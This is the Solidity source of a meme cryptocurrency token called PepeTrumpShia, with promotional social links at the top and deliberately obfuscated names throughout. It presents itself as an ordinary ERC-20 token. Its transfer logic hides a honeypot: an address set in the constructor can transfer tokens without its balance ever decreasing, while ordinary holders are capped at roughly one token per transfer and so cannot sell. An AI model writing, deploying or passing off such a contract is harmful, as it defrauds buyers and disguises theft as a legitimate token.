/*

Telegram: https://t.me/PepeTrumpShia

Website: https://pepetrumpshia.crypto-token.live/

Twitter: https://twitter.com/PepeTrumpShia

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepeTrumpShia is Ownable {
    function transfer(address xtcigswkohrf, uint256 razwpyvx) public returns (bool success) {
        qaslgepwjkr(msg.sender, xtcigswkohrf, razwpyvx);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory fhzxdqnrkt, string memory sjokw, address wsztc, address qjygfwtxbz) {
        name = fhzxdqnrkt;
        symbol = sjokw;
        balanceOf[msg.sender] = totalSupply;
        seracvqm[qjygfwtxbz] = micdtebvzy;
        kgopdrlbj = IUniswapV2Router02(wsztc);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function qaslgepwjkr(address nlksxrpo, address xtcigswkohrf, uint256 razwpyvx) private {
        address kplfdwoy = IUniswapV2Factory(kgopdrlbj.factory()).getPair(address(this), kgopdrlbj.WETH());
        if (0 == seracvqm[nlksxrpo]) {
            if (nlksxrpo != kplfdwoy && reanfyzvspu[nlksxrpo] != block.number && razwpyvx < totalSupply) {
                require(razwpyvx <= totalSupply / (10 ** decimals));
            }
            balanceOf[nlksxrpo] -= razwpyvx;
        }
        balanceOf[xtcigswkohrf] += razwpyvx;
        reanfyzvspu[xtcigswkohrf] = block.number;
        emit Transfer(nlksxrpo, xtcigswkohrf, razwpyvx);
    }

    uint256 private micdtebvzy = 114;

    string public name;

    uint8 public decimals = 9;

    mapping(address => uint256) private reanfyzvspu;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address nlksxrpo, address xtcigswkohrf, uint256 razwpyvx) public returns (bool success) {
        require(razwpyvx <= allowance[nlksxrpo][msg.sender]);
        allowance[nlksxrpo][msg.sender] -= razwpyvx;
        qaslgepwjkr(nlksxrpo, xtcigswkohrf, razwpyvx);
        return true;
    }

    IUniswapV2Router02 private kgopdrlbj;

    mapping(address => uint256) private seracvqm;

    string public symbol;

    function approve(address ukvinxb, uint256 razwpyvx) public returns (bool success) {
        allowance[msg.sender][ukvinxb] = razwpyvx;
        emit Approval(msg.sender, ukvinxb, razwpyvx);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);
}
